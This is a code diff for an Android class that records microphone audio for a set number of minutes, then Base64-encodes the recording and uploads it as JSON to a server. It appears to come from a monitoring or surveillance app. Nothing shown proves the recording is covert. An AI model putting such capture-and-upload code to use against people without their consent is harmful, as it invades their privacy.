@@ -6,10 +6,15 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
 
+import org.apache.commons.io.FileUtils;
+import org.json.JSONException;
+import org.json.JSONObject;
+
 import android.content.Context;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.Environment;
+import android.util.Base64;
 
 import com.inet.android.request.FileRequest;
 import com.inet.android.utils.ConvertDate;
@@ -29,16 +34,18 @@ public final class RecordAudio {
 
 	private MediaRecorder mMediaRecorder;
 	private final String TAG = "RecordAudio";
-	ConvertDate date;
-	String time;
+	private ConvertDate date;
+	private String time;
 	private static final String mPathName = "data";
+	private static final String recordTypeStr = "22";
 
 	// Thread pool
 	private ExecutorService mThreadPool;
 	int minute;
 	private AtomicBoolean mIsPlaying = new AtomicBoolean(false);
 	private AtomicBoolean mIsRecording = new AtomicBoolean(false);
-	String outputFileName;
+	private String outputFileName;
+	private String LOG_TAG = "RecordAudio";
 	private static Context mContext;
 
 	public RecordAudio(Context context, int minute) {
@@ -232,10 +239,35 @@ public final class RecordAudio {
 		}
 	}
 
-	public void SendAudio(String path) {
-		FileRequest audio = new FileRequest(mContext, this.outputFileName,
-				this.minute, this.time);
-		audio.sendRequest();
+	private String encodeFileToBase64Binary(String fileName) throws IOException {
+
+		File file = new File(fileName);
+		byte[] bytes = FileUtils.readFileToByteArray(file);
+		String encoded = Base64.encodeToString(bytes, 0);
+		return encoded;
+	}
+
+	private void SendAudio(String path) {
+		String sendJSONStr = null;
+		JSONObject object = new JSONObject();
+		ConvertDate getDate = new ConvertDate();
+		try {
+			object.put("time", getDate.logTime());
+			object.put("type", recordTypeStr);
+			object.put("duration", this.minute);
+			object.put("path", path);
+			object.put("record", encodeFileToBase64Binary(path));
+
+			// sendJSONStr = jsonObject.toString();
+			sendJSONStr = object.toString();
+		} catch (JSONException e) {
+			Logging.doLog(LOG_TAG, "json сломался", "json сломался");
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			e.printStackTrace();
+		}
+		FileRequest audio = new FileRequest(mContext);
+		audio.sendRequest(sendJSONStr); // добавить строку request
 
 	}
 
